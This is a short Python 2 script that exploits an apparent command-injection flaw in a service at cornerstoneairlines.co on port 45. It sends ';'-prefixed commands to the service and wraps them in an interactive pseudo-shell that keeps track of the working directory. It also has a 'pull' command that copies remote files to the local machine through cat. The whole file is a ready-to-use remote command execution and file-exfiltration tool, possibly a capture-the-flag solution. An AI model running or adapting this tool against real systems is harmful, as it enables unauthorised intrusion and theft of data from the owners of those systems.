import socket 

host = "cornerstoneairlines.co"
port = 45



def execute_cmd(cmd):
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((host,port))
	s.recv(1024)
	s.send(";" + cmd + "\n")
	return s.recv(1024)

def pull(cmd):
	c = cmd.split()
	output = execute_cmd("cat " + c[1])
	newfile = open(c[2],"w+")
	newfile.write(output)
	
def shell():
	pwd = "/"
	while 1:
		cmd = raw_input(pwd +">")
		if(cmd.startswith("cd")):
			pwd = execute_cmd("cd "+ pwd + ";" + cmd + ";" + "pwd")
			pwd = pwd.strip()
		elif(cmd.strip() == "exit"):
			break
		else:
			data = execute_cmd("cd " +pwd + ";" + cmd)
			print("cd " + pwd + ";" + cmd)
			print(data)

def help():
	print("1.shell---> Drop into an interactive shell and allow users to gracefully exit")
	print("2. pull <remote-path> <local-path> --->Download files")
	print("3. help ---> Shows this help menu")
	print("4. quit --->Quit the shell")
if __name__=='__main__':
	while True: 
		commands = raw_input(">")
		if(commands.strip() == 'help'):
			help()
		elif (commands.strip() == 'quit'):
			break
		elif (commands.strip() == 'shell'):
			shell()
		elif(commands.strip().startswith('pull')):
			pull(commands)
		else:
			help()